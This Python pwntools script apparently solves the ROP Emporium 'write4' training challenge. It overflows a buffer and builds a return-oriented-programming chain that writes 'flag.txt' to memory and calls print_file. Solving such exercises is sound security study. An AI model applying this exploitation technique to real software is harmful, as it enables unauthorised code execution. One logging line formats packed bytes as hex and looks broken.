#!/usr/bin/env python3
# ROP Emporium write4
from pwn import *   # import pwntools

context.log_level = "debug"   # Debugging information
context.binary = elf = ELF("./write4")    # Set architecture info
io = process()    # Create a process with the loaded elf
rop = ROP(elf)    # Create the ROP object

offset = 40

data_section = elf.symbols.data_start
info("Data section: 0x%x", data_section)
# 0x0000000000400690: pop r14; pop r15; ret;
pop_pop_ret = p64(0x0000000000400690)
info("pop r14; pop r15; ret; : 0x%x", pop_pop_ret)
# 0x0000000000400628: mov qword ptr [r14], r15; ret;
mov_ret = 0x0000000000400628
info("mov qword ptr [r14], r15; ret; : 0x%x", mov_ret)

rop.raw([pop_pop_ret, data_section, "flag.txt", mov_ret])
rop.print_file(data_section)
rop_chain = rop.chain()

payload = b""
payload += b"A" * offset
payload += rop_chain

write("payload.txt", payload)

io.recvuntil(b"> ")
io.sendline(payload)
io.recvuntil(b"Thank you!\n")
success(io.recv())
